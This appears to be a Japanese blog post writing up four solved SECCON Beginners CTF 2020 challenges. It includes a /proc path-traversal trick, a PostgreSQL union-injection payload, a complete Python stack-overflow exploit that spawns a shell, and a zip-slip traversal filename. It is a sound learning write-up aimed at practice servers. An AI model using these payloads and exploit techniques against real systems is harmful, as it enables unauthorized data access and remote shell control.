+++
categories = [ "tech" ]
tags = [ "ctf", "ctf4b", "seccon", "pwn", "web" ]
date = 2020-05-24
title = "SECCON Beginners CTF 2020解けた問題 writeup"
description = "ctf4bに参加しました．解けた問題をまとめます．"
+++

こんにちは．福岡では緊急事態宣言は解除されましたが授業もアルバイト，ゼミもリモートのため相変わらず外出しない生活を送っています．

## ctf4b
ctf4bに大学の研究室のメンバーで参加してきました．昨年は全く手が出ませんでしたが今年は結構楽しくCTFができました．(解けたとは言ってない．)
得意分野と言える分野もないので雑食でいろいろな分野を覗いてました．
僕は`readme`,`beginner's stack`,`tweetstore`をときました．また，時間内にフラグは得られませんでしたが終了後に気づいた`unzip`も記載します．
(その他の問題も解けたら追記しようかな)
では，

[https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html](https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html)

### 追記
pwnの[elementary stack](https://terassyi.net/posts/2020/06/04/elementary-stack.html)についてポストしました．

### readme
Miscの問題です．問題サーバで動いているコードが配布されます．
```python
#!/usr/bin/env python3
import os

assert os.path.isfile('/home/ctf/flag') # readme

if __name__ == '__main__':
    path = input("File: ")
    if not os.path.exists(path):
        exit("[-] File not found")
    if not os.path.isfile(path):
        exit("[-] Not a file")
    if '/' != path[0]:
        exit("[-] Use absolute path")
    if 'ctf' in path:
        exit("[-] Path not allowed")
    try:
        print(open(path, 'r').read())
    except:
        exit("[-] Permission denied")
```
ncコマンドでサーバに接続すると`File: `と出てきてパスを入力します．`/home/ctf/flag`を開くことができればフラグが得られそうです．
しかし．入力文字列にはいくつかの制限があります．
- 指定したパスが存在する
- 指定したパスがファイルである
- 指定したパスが絶対パスである
- 指定されたパスに`ctf`という文字列が存在しない
- 指定したファイルが開ける

条件は以上です．
`ctf`が許されないので`/home/ctf/flag`は当然の如く失敗します．
**ctfという文字列を使用せずにどの様にしてパスを取得するか**がポイントです．
現在のプロセスが動いているカレントディレクトリを取得することができれば良さげです．
そこで登場するのが`/proc`です．
`/proc`ファイルシステムは特殊なディレクトリでシステムの情報や動作しているプロセスの情報を取得することができます．
あるプロセスに関する情報が欲しい場合は`/proc/[pid]`を参照します．自身のプロセスの情報を得たい場合は`/proc/self`です．
`/proc`は面白いのでぜひいろいろ覗いてみてください．
さて，`/proc/self/cwd`がプロセス自身のカレントディレクトリへのシンボリックリンクとなっています．が，ここで`/proc/self/cwd`を入れてもファイルじゃないのでダメです．そこで，`/proc/self/environ`を入力してみます．すると環境変数がいっぱい出てきます．その中に`PWD=/home/ctf/server`が見つかりました．
このプロセスは`/home/ctf/server`で動いてそうですね．

なので`/proc/self/cwd/../flag`と入力するとフラグを得ることができました．

### Tweetstore
WebのSQLインジェクションの問題です．Go言語で書かれたサーバのコードが配布されました．データベースにツイートが保存されています．`search word`に指定したワードに関連したツイートを`limit`で指定した数まで表示させることができます．
データベース関連のコードは以下の様になっていました．
```go
func initialize() {
	var err error

	dbname := "ctf"
	dbuser := os.Getenv("FLAG")
	dbpass := "password"

	connInfo := fmt.Sprintf("port=%d host=%s user=%s password=%s dbname=%s sslmode=disable", 5432, "db", dbuser, dbpass, dbname)
	db, err = sql.Open("postgres", connInfo)
	if err != nil {
		log.Fatal(err)
	}
}
```
使用しているDBはpostgres sqlですね．
この関数でデータベースへの接続の処理を行っています．`dbuser`に環境変数からFLAGの値を読み出してそれをユーザー名としてログインしている様です．
なのでDBのユーザー名がわかればいいということになります．
では次はクエリを組み立てる部分．
```go
type Tweets struct {
	Url        string
	Text       string
	Tweeted_at time.Time
}

func handler_index(w http.ResponseWriter, r *http.Request) {

	tmpl, err := template.ParseFiles(tmplPath + "index.html")
	if err != nil {
		log.Fatal(err)
	}

	var sql = "select url, text, tweeted_at from tweets"

	search, ok := r.URL.Query()["search"]
	if ok {
		sql += " where text like '%" + strings.Replace(search[0], "'", "\\'", -1) + "%'"
	}

	sql += " order by tweeted_at desc"

	limit, ok := r.URL.Query()["limit"]
	if ok && (limit[0] != "") {
		sql += " limit " + strings.Split(limit[0], ";")[0]
	}
	// select url, text, tweeted_at from tweets where text like ctf4b(decoded) order by tweeted_at desc limit 10--

	// select schemaname, tablename, tableowner from pg_tables
	var data []Tweets


	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	rows, err := db.QueryContext(ctx, sql)
	if err != nil{
		http.Error(w, http.StatusText(500), 500)
		return
	}

	for rows.Next() {
		var text string
		var url string
		var tweeted_at time.Time

		err := rows.Scan(&url, &text, &tweeted_at)
		if err != nil {
			http.Error(w, http.StatusText(500), 500)
			return
		}
		data = append(data, Tweets{url, text, tweeted_at})
	}

	tmpl.Execute(w, data)
}
```
こちらでクエリを組み立てています．`search word`として入力された値の中の`'`を`\'`として出力する様に処理されていて，`limit`として入力された値では`;`が入らない様になっています．

試しに`seach word`に`'--`を入力してみると`Internal Server Error`を返しました．`500`を返す場所は二箇所ありますが，とりあえず単純なインジェクションではダメそうです．

さて，Postgres SQLでユーザ情報を取得するにはどの様なクエリを投げれば良いでしょうか．ユーザに関する情報は`pg_user`というテーブルに保存されています．
`pg_user`の構造を見てみましょう．以下を参照ください．
[pg_user](https://www.postgresql.jp/document/8.0/html/view-pg-user.html)
というわけでユーザ名は`usename`として参照できそうですね．

ではインジェクションするクエリを組み立てます．
```go
var sql = "select url, text, tweeted_at from tweets"
```
この部分から，３つ列を取り出しており，`text`, `text`, 'timestamp'型のようです．というわけで`pg_user`から`usename`を含む何かしらの３つの列を取り出して結合すれば良さげです．
最初はlimitの後に`10 union select usename,usename,null from pg_user;`をつなげればいいと思っていましたが，limit句の後にunionはつなげられないらしく，つなげる場合，
```sql
(select url, text, tweeted_at from tweets where text like '%[:search word]%' order by tweeted_at desc limit 10) union (select usename, usename, null from pg_user)
```
みたいに()を付けないといけないらしく，無理そうだということでした．

さてそれではどうするか，`limit`はダメそうなのでやはり`search word`でクエリを組み立てる必要がありそうです．
`'`が入らなそうなのでどうしようかと思っていましたが，`\'`になるだけなので実はいけるのではと思い手元にPostgre環境を立てて実行してみたところ実行できました．
というわけで実は`search word`でインジェクションのクエリが組み立てられそうです．というわけで次のようなクエリを組み立てました．
```sql
select url, text, tweeted_at from tweets where text like '%hoge\' union select usename, usename, null from pg_user;-- %' order by tweeted_at desc limit 10;
```
これは`;--`より後ろがコメントとして無視されるので実際に実行されるのは以下のようになります．
```sql
select url, text, tweeted_at from tweets where text like '%hoge\' union select usename, usename, null from pg_user;
```
これで行けると思いましたが，`500`になってしまいました．
手元の環境で実行できているのに`500`になるので他の原因がありそうです．
そういえば`500`になるのはもう一箇所ありました．
ここですね．
```go
err := rows.Scan(&url, &text, &tweeted_at)
		if err != nil {
			http.Error(w, http.StatusText(500), 500)
			return
		}
```
どうしてエラーになるのかと眺めていたところ，`rows.Scan()`はクエリの実行結果に`null`が入っているとエラーを返すことに気付きました．
[こちら](https://qiita.com/Neetless/items/cce3d256a3b879d6f9b3)を参照してください．
つまり，先ほどのクエリでは`null`を返しているのでダメということですね．
というわけで最終的に組み立てたのは以下のようなクエリです．
```sql
select url, text, tweeted_at from tweets where text like '%hoge\' union select usename, usename, current_timestamp from pg_user;
```
先ほど`null`だった部分を`current_timestamp`に変更して現在時刻を取得するようにするとフラグを得ることができました．

### Beginner's Stack
Pwnのスタックバッファオーバーフローの問題です．実行ファイルが配布されます．
問題サーバに接続すると以下のように表示されます．
`win`を呼び出せば`system('/bin/sh')`が実行されるようですが，`main`をディスアセンブルしても`win`を呼び出している箇所はありません．
というわけでどこかの関数のリターンアドレスを書き換えて`win`に飛ばせれば良さそうです．
```
 9001
Your goal is to call `win` function (located at 0x400861)

   [ Address ]           [ Stack ]
                   +--------------------+
0x00007ffcfd4212b0 | 0x0000000000000000 | <-- buf
                   +--------------------+
0x00007ffcfd4212b8 | 0x0000000000000000 |
                   +--------------------+
0x00007ffcfd4212c0 | 0x0000000000000000 |
                   +--------------------+
0x00007ffcfd4212c8 | 0x00007f9ada20d170 |
                   +--------------------+
0x00007ffcfd4212d0 | 0x00007ffcfd4212e0 | <-- saved rbp (vuln)
                   +--------------------+
0x00007ffcfd4212d8 | 0x000000000040084e | <-- return address (vuln)
                   +--------------------+
0x00007ffcfd4212e0 | 0x0000000000400ad0 | <-- saved rbp (main)
                   +--------------------+
0x00007ffcfd4212e8 | 0x00007f9ad9c14b97 | <-- return address (main)
                   +--------------------+
0x00007ffcfd4212f0 | 0x0000000000000001 |
                   +--------------------+
0x00007ffcfd4212f8 | 0x00007ffcfd4213c8 |
                   +--------------------+

Input:
```
親切にスタックの状況を表示してくれます．何かしらの入力を与えると入力した内容がスタックに格納されてもう一度表示されます．
試しにaaaをいくつか入力します．すると，
```
   [ Address ]           [ Stack ]
                   +--------------------+
0x00007ffcfd4212b0 | 0x6161616161616161 | <-- buf
                   +--------------------+
0x00007ffcfd4212b8 | 0x0000000a61616161 |
                   +--------------------+
0x00007ffcfd4212c0 | 0x0000000000000000 |
                   +--------------------+
0x00007ffcfd4212c8 | 0x00007f9ada20d170 |
                   +--------------------+
0x00007ffcfd4212d0 | 0x00007ffcfd4212e0 | <-- saved rbp (vuln)
                   +--------------------+
0x00007ffcfd4212d8 | 0x000000000040084e | <-- return address (vuln)
                   +--------------------+
0x00007ffcfd4212e0 | 0x0000000000400ad0 | <-- saved rbp (main)
                   +--------------------+
0x00007ffcfd4212e8 | 0x00007f9ad9c14b97 | <-- return address (main)
                   +--------------------+
0x00007ffcfd4212f0 | 0x0000000000000001 |
                   +--------------------+
0x00007ffcfd4212f8 | 0x00007ffcfd4213c8 |
                   +--------------------+

Bye!
```
こんな感じにスタックの状況が変化します．もっと多くのaを入力すると，
```
   [ Address ]           [ Stack ]
                   +--------------------+
0x00007ffea45ceb70 | 0x6161616161616161 | <-- buf
                   +--------------------+
0x00007ffea45ceb78 | 0x6161616161616161 |
                   +--------------------+
0x00007ffea45ceb80 | 0x6161616161616161 |
                   +--------------------+
0x00007ffea45ceb88 | 0x6161616161616161 |
                   +--------------------+
0x00007ffea45ceb90 | 0x6161616161616161 | <-- saved rbp (vuln)
                   +--------------------+
0x00007ffea45ceb98 | 0x6161616161616161 | <-- return address (vuln)
                   +--------------------+
0x00007ffea45ceba0 | 0x6161616161616161 | <-- saved rbp (main)
                   +--------------------+
0x00007ffea45ceba8 | 0x00007f0a61616161 | <-- return address (main)
                   +--------------------+
0x00007ffea45cebb0 | 0x0000000000000001 |
                   +--------------------+
0x00007ffea45cebb8 | 0x00007ffea45cec88 |
                   +--------------------+

/home/pwn/redir.sh: line 2: 23776 Segmentation fault      ./chall
```
スタックがオーバーフローしてセグフォで落ちました．
というわけでスタックバッファオーバーフローで`vuln`のリターンアドレスを`win`のアドレスに書き換えます．
ペイロードはこのように組み立てました．
```python
payload = b'a' * 32
payload += (0x7fff6858b810).to_bytes(8, 'little') # '\x10\xb8\x58\x68\xff\x7f\x00\x00'
payload += (0x400861).to_bytes(8, 'little') # '\x61\x08\x40\x00' + '\x00' * 4
payload += b'\n
```
`vuln`のrbpの値は適当に値を入れていますが，40バイト目以降に`win`のアドレスを書き込んでいます．
これで実行すると，スタックの内容が書きかわり，以下のようなメッセージが出力されました．
> Oops! RSP is misaligned!
Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
This instruction fails when RSP is not a multiple of 0x10.
Find a way to align RSP! You're almost there!

`system`を呼び出すためにはRSPの値が`0x10`の倍数でないといけないようです．はて？という感じでしたが，とにかくRSPを揃えるには関数を呼び出す時と終了する際に何かしら手を加える必要がありそうです．
ここで，`win`のアドレスに飛ばす前に一度`ret`を噛ませてrspを揃えてみます．
組み立てたペイロードは以下のような感じ．
```python
payload = b'a' * 32
payload += (0x7fff6858b810).to_bytes(8, 'little') # '\x10\xb8\x58\x68\xff\x7f\x00\x00'
payload += (0x4007f0).to_bytes(8, 'little') # '\xf0\x07\x40\x00\x00\x00\x00\x00'
payload += (0x400861).to_bytes(8, 'little') # '\x61\x08\x40\x00' + '\x00' * 4
payload += b'\n'
```
`win`のアドレスに飛ぶ前に'vuln'から復帰する時に呼び出される`ret`のアドレスに一度飛ばします．そうすると，`ret`はスタックをpopしてそのアドレスに飛ぶので，その時点でのスタックの一番上である`ret`のアドレスの直後に`win`のアドレスを書き込みます．
こうすることでRSPが揃った状態で`system`を呼び出すことができるようになります．
exploitコードの全体は以下．
```python
import socket, time, telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('bs.quals.beginners.seccon.jp', 9001))

time.sleep(1)

print(s.recv(2048).decode())

payload = b'a' * 32
payload += (0x7fff6858b810).to_bytes(8, 'little') # '\x10\xb8\x58\x68\xff\x7f\x00\x00'
payload += (0x4007f0).to_bytes(8, 'little') # '\xf0\x07\x40\x00\x00\x00\x00\x00'
payload += (0x400861).to_bytes(8, 'little') # '\x61\x08\x40\x00' + '\x00' * 4
payload += b'\n'

print("payload: ", payload)

s.sendall(payload)

time.sleep(1)
print(s.recv(4096).decode())

t = telnetlib.Telnet()
t.sock = s

t.interact()
```
実行すると，これまでと同様にスタックの内容が表示された後Congratulations!が表示されシェルをとることができました．
```
Congratulations!

ls
chall
flag.txt
redir.sh
```
あとは`ls`,`cat flag.txt`でフラグが得られました．
余談ですが，僕はMacの方は`python`で`python3`が実行されるようにエイリアスしているのですが，解析に使用したVMでは`python`コマンドを叩くと実行されるのは`python3`なんです．VMではローカルで実行しながら解析してpython2でペイロード流していたんですが，ncでリモートに繋ぐ時はMacのターミナルからしていたのでpythonのバージョンが違っているままリモートに実行してしまいエクスプロイトが通りませんでした．すごいありがちなミスですがこれに気づくのに結構時間潰したのでpythonのバージョンには皆さんも気をつけてください．(戒め)

### unzip
Web問のディレクトリトラバーサルの問題です．phpで書かれたファイルと`docker-compose.yml`は配布されました．
この問題は時間内にフラグを得ることができませんでしたが，終了後に再度チャレンジしてフラグをとることができました．(点数欲しかった)
さて指定されたURLにアクセスするとzipファイルを解凍してくれるサービスが動いていました．
zipファイルをアップロードすると解凍され，解凍後のファイルの中身を参照することができます．
脆弱なコードは以下．
```php
$user_dir = "/uploads/" . session_id();

// return file if filename parameter is passed
if (isset($_GET["filename"]) && is_string(($_GET["filename"]))) {
    if (in_array($_GET["filename"], $_SESSION["files"], TRUE)) {
        $filepath = $user_dir . "/" . $_GET["filename"];
        header("Content-Type: text/plain");
        echo file_get_contents($filepath);
        die();
    } else {
        echo "no such file";
        die();
    }
}
```
もしこれまでアップロードされ，解凍されたファイルの名前とリクエストされたファイルの名前が一致している場合，`$filepath`として`$user_dir/filename`というふうに結合します．`$user_dir`は`$user_dir = "/uploads/" . session_id();`という感じで生成されています．
入力されたパスの値をバリデーションしていないので，`../`のような入力がそのまま通ってしまいます．これを利用してフラグを読み出します．
ここで`docker-compose.yml`をみてみると以下のような記述があります．
```
    volumes:
      - ./public:/var/www/web
      - ./uploads:/uploads
      - ./flag.txt:/flag.tx
```
フラグのファイルは`/flag.txt`に配置されていて，アップロードされたファイルは`/uploads/[session id]/filename`に保存されている感じです．
つまり，`filename`として`../../../flag.txt`という文字列を与えることができれば目的のパスにアクセスできます．
ここで僕はどのようにして`../../../flag.txt`というファイルを生成するか悩んでいました．base64でエンコードしたファイルを渡したりエスケープされた状態のファイル名で渡してみたりしましたがどうもうまくいきません．
本番はここでタイムアップとなりました．
その後，ダメもとで
```
$ zip hoge ../../../flag.txt
```
を実行してみると，
```
zip warning: name not matched: ../../../flag.txt

zip error: Nothing to do! (hoge.zip)
```
ん？できそう？？？
エラーの内容がファイルないよっていうエラーなのでもしやと思い
```
touch ../../../flag.txt
```
で作成して，もう一度実行してみると．．．
```
$ zip hoge ../../../flag.txt
  adding: ../../../flag.txt (stored 0%)
```
あらできてしまいました．
これをアップロードしてアクセスするとフラグが得られてしまいました．

時間内に気づけばよかった．．．

## まとめ
とりあえずわかっている問題はこんな感じでした．CTFは結構ブランクを開けて(元々全然できません)最近Pwnに入門したところでした．他にもheap問に取り組んだりしていたのですが，自分でフラグを通すことはできませんでした．それでも昨年参加した際は何もできなかったので今回は何問か解くことができてよかったです．CTF楽しかったのでこれからもう少しCTFに入門してみようかなと思います．
弊研究室チームは79位でした．対戦してくださった皆さんありがとうございました．
1000チーム以上の参加がある中大きな問題なく実施してくださった運営の方々に感謝します．ありがとうございました．

{{<x user="terassyi_" id="1264421910714015744">}}

<script>
import { Tweet } from 'vue-tweet-embed/dist'

export default {
    components: {Tweet}
}
</script>
